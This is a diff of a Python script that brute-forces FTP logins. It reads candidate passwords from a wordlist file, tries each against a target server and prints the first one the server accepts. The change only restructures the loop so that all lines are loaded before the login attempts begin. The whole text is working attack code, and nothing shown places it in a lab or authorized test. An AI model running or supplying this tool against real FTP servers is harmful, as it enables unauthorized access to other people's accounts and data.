@@ -9,25 +9,29 @@ time_start = time.time() 		#start clock
 server = ftplib.FTP()
 server.connect(IP_ADDR,int(PORT_NUM))
 doc_len = len(open(file_path, "r", errors='replace').readlines())
-num_attempts = 0
+lines = []
 with open(file_path, "r", errors='replace') as f:
 	for _ in range(doc_len):
-		num_attempts += 1
-		print(num_attempts)
-		#========pull passwords from file line by line======
-		potential_password = f.readline()
-		#========strip passwords of new line char===========
-		potential_password = potential_password.rstrip('\n')
-		#========ATTEMPT FTP LOGIN HERE====================
-		try:
-			server.login(username,potential_password)
-			check_login = server.voidcmd("NOOP")	#send NOOP cmd and wait for 2xx response
-			check_login = check_login[0] #get first char of response
-			if(check_login == '2'):		#if response print password and exit
-				print(potential_password)
-				break
-		except:
-			pass
+		lines.append(f.readline())
+num_attempts = 0
+
+for i in range(doc_len):
+	num_attempts += 1
+	print(num_attempts)
+	#========pull passwords from file line by line======
+	potential_password = lines[i]
+	#========strip passwords of new line char===========
+	potential_password = potential_password.rstrip('\n')
+	#========ATTEMPT FTP LOGIN HERE====================
+	try:
+		server.login(username,potential_password)
+		check_login = server.voidcmd("NOOP")	#send NOOP cmd and wait for 2xx response
+		check_login = check_login[0] #get first char of response
+		if(check_login == '2'):		#if response print password and exit
+			print(potential_password)
+			break
+	except:
+		pass
 #time.sleep(300)
 time_stop = time.time()			#end clock
 time_check = time_stop - time_start
